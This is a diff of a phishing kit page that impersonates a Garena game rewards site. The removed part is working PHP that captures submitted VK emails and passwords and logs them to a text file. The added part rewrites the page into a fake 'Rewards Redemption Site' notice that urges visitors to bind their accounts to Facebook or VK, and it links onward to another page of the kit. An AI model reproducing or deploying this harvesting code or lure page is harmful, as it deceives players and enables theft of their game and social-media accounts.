@@ -1,19 +1,3 @@
-<?php
-#mdified by prince kummar 
-$nickname= $_POST['nickname'];
-$name= $_POST['nama'];
-$emailvk= $_POST['emailvk'];
-$passvk= $_POST['passvk'];
-
-$ip = $_SERVER['REMOTE_ADDR'];
-$today = date("F j, Y, g:i a");
-$link = $_SERVER['SERVER_NAME'];
-$browser = $_SERVER['HTTP_USER_AGENT'];
-
-file_put_contents("userlog.txt", "nickname: " . $_POST['nickname'] . "Vk pass: " . $_POST['passvk'] . " Nameonvk: ".$namefb. " Email: ". $emailvk. "\n", FILE_APPEND);
-
-?>
-
 <!DOCTYPE html>
 <html lang="zh">
 
@@ -63,26 +47,19 @@ file_put_contents("userlog.txt", "nickname: " . $_POST['nickname'] . "Vk pass: "
 <div class="col-md-5 col-sm-5 col-xs-5">
 <img src="imgg/logoff.png" class="gamelogo">
 </div><div class="col-md-5 col-sm-5 col-xs-5">
-<img src="imgg/garena.png" class="garenalogo"></div><span class="cit topics col-md-12 col-sm-12 col-xs-12">Sukses Klaim!</span></div><div class="a_wrap"><div></div>
+<img src="imgg/garena.png" class="garenalogo"></div><span class="cit topics col-md-12 col-sm-12 col-xs-12">Rewards Redemption Site</span></div><div class="a_wrap"><div></div>
 <br><div><div></a></span></div>
+</div><span class="txt_c_1">Important notice :</span><div class="more"><ol><li><!-- react-text: 18 -->1. Code Redemption<!-- /react-text --><span class="colorUo"> 12 </span><!-- react-text: 20 --> Characters, Consisting of Uppercase Letters and Numbers.<!-- /react-text --></li>
+<li><!-- react-text: 22 -->2. Item rewards are displayed in
+<!-- /react-text --><span class="colorUo">&nbsp;[vault]&nbsp;</span><!-- react-text: 24 -->In-game lobby tabs; Gold or diamonds will be added in the Account Wallet automatically.<!-- /react-text --></li>
+<li>3. Please note the redemption due date. Expired codes cannot be exchanged.
 
-<br>
-<br><div><div></a></span></div>
-<p><h5>Succes Claim!</h5></p>
-</div><div class="more"><ol>
-<li><!-- react-text: 18 -->1. Congratulations The Prize Has Been Claimed </li>
-<li><!-- react-text: 22 -->2. Please Wait For Your Prize In A Few Days </li>
-<br>
-<li>Remember: You Can't Claim Rewards If You Use a Guest Account. Please Bind Your Account First To Facebook or VK To Receive Prizes</li>
-<br>
-<center><a href="index.php" class="button"><img src="imgg/logout.png" </center>
+</li>
+<li>4. Please contact customer service if you experience any issues.</li>
+<li>5. Reminder: You will not be able to redeem your rewards with a guest account. You can bind your account to Facebook or VK to receive rewards.</li></ol>
+<center><a href="choose.html" class="button"><img src="imgg/button.png" </center>
 </div></div></div></div>
 
-<br>
-
-<br>
-
-<br>
 <body>
 <div class="g-footer clearFix">
     <div class="m-foot-wrap">
@@ -92,4 +69,6 @@ file_put_contents("userlog.txt", "nickname: " . $_POST['nickname'] . "Vk pass: "
     <div id="app"></div>
 
 <script type="text/javascript" src="bundle.js"></script></body>
+
+
 </html>
